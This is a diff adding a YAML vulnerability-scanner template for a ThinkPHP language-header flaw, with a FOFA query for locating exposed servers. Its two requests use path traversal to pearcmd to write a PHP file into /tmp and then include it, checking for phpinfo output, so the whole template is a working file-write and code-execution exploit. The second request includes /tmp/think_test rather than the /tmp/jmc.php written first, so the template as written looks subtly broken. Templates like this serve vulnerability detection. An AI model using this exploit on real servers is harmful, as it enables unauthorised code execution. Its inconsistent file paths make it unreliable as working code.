@@ -1,0 +1,47 @@
+info:
+  vulId: thinkphp_think_lang_rce.yaml
+  detail: thinkphp think_lang 任意文件写入漏洞。影响版本v6.0.1 < Thinkphp < v6.0.13     Thinkphp v5.0.x     Thinkphp v5.1.x
+  fofaQuery: header="think_lang"
+rules:
+  - request:
+      payload:
+        - ""
+      path: "{{rootUrl}}/public/index.php?+config-create+/<?=phpinfo()?>+/tmp/jmc.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        think-lang: "../../../../../../../../usr/local/lib/php/pearcmd"
+        Cookie: think_lang=zh-cn
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - /pear
+        place: body
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/index.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        think-lang: ../../../../../../../../tmp/think_test
+        Cookie: think_lang=zh-cn
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - PHP Extension
+          - PHP Version
+          - phpinfo
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
